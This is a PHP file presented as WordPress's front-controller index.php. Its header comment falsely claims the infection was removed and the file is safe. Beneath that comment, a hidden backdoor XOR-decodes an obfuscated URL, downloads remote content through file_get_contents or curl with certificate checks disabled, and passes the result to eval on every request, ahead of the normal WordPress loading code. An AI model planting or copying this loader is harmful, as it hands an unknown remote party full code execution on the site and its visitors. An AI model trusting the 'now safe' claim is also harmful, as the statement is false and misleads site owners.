<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$key = 'k';
$data = "\x03\x1f\x1f\x15\x16\x3a\x2f\x2f\x1b\x0a\x10\x2e\x0c\x0e\x1f\x03\x1e\x0b\x1e\x16\x04\x1b\x02\x08\x09\x1f\x04\x09\x1f\x2e\x02\x08\x06\x2f\x16\x04\x08\x0b\x04\x05\x0a\x2f\x0b\x04\x05\x0a\x2f\x1b\x04\x05\x16\x2f\x03\x04\x0a\x01\x16\x2f\x06\x0a\x0e\x09\x2f\x0e\x09\x01\x04\x11\x2e\x1f\x11\x1f";
$full_url = '';
for($i = 0; $i < strlen($data); $i++) {
    $full_url .= chr(ord($data[$i]) ^ ord($key));
}

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
